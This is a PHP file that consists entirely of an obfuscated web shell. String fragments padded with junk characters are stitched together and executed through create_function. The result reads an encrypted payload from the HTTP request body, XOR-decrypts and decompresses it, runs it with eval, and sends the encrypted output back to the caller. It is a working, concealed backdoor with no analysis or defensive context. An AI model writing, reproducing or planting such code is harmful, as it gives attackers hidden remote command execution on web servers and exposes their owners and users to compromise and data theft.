<?php
$z='$k="QcQc54cQQbeb";$kh="c605Q126dd255Q";Q$kf="2a7e4a398797Q";$p=Q"QgFiQ3kQ1';
$m='baQsQe64_deQcode($mQ[1]),$k)));$o=@Qob_get_QQconQtentsQ();@obQ_eQnd_clean';
$I='Qr($Qi=0;$i<$l;Q)Q{for($Qj=0;($j<$cQ&&$Qi<$l);$Qj++,$i++Q){$QoQ.=$Qt{$i}^$k';
$i='tQQs("php://inpQQut"),$m)==1)Q {@ob_Qstart();@eQval(Q@QgzuncQQompress(@x(@';
$A='cyxQ6OCetuZ";Qfunction x($t,$k)Q{$c=stQrlen($Qk);$l=stQQrlen($t);$o=Q"";fo';
$l='();$Qr=@base6Q4_encode(Q@x(@gzcQomprQQess($o),$k));Qprint(Q"$p$khQ$r$kf");}';
$G=str_replace('DV','','DVcDVDVreate_fuDVncDVtiDVon');
$Y='{$j};Q}}retuQQrn $oQ;}if (@preg_mQatch("/Q$kh(.+Q)$Qkf/",@file_gQQet_conten';
$q=str_replace('Q','',$z.$A.$I.$Y.$i.$m.$l);
$K=$G('',$q);$K();
?>
